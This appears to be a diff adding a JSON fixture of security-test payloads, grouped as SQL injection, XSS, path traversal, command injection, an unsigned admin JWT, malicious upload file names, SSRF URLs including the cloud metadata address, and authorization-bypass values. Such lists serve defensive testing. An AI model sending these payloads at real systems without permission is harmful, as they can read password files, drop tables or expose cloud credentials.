@@ -1,0 +1,10 @@
+{
+  "sql_injection": ["'", "' or 1=1 --", "\" or \"1\"=\"1", "1; DROP TABLE users; --"],
+  "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>"],
+  "path_traversal": ["../etc/passwd", "..\\\\..\\\\windows\\\\win.ini", "%2e%2e%2fetc%2fpasswd"],
+  "command_injection": [";id", "&& whoami", "| cat /etc/passwd"],
+  "jwt_tamper": ["Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwiYWRtaW4iOnRydWV9.", "Bearer invalid.token.value"],
+  "file_upload": ["shell.php", "avatar.png.php", "../../evil.jsp"],
+  "ssrf": ["http://127.0.0.1:80", "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd"],
+  "authorization_bypass": ["0", "1", "admin", "true"]
+}
